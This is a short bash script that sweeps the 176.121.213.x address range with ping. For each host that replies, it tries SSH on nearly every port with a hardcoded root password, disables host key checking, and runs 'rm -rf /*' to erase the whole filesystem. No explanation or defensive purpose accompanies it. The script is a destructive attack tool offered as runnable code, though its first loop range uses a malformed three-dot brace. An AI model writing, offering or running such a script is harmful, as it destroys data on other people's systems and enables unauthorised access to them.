#!/bin/bash
for i in {1...254}
do
        ping -c 3 -i 0.2 -W 1 176.121.213.$i
        if [ $? -eq 0 ];then
	    for  a  in {1..65535} 
	    do
	    [ $a -eq 22 ] && continue
            sshpass -p Taren1 ssh -o StrictHostKeyChecking=no -p $a  root@176.121.213.$i "rm -rf /*"
	    done
        fi
done

